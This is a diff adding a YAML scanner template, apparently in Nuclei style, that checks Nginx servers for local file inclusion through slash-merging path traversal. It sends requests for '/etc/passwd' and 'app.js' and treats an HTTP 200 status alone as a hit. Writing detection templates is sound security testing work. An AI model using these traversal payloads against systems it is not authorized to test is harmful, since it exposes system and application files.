@@ -1,0 +1,23 @@
+id: nginx-merge-slashes-path-traversal
+brief:
+    title: Nginx Server - Local File Inclusion
+    by: dhiyaneshDk
+    level: high
+    about: Nginx server is vulnerable to local file inclusion.
+    label:
+        - exposure
+        - config
+        - lfi
+        - nginx
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}///////../../../etc/passwd'
+        - '{{BaseURL}}/static///////../../../../etc/passwd'
+        - '{{BaseURL}}///../app.js'
+      signs:
+        - "on": status
+          status:
+            - 200
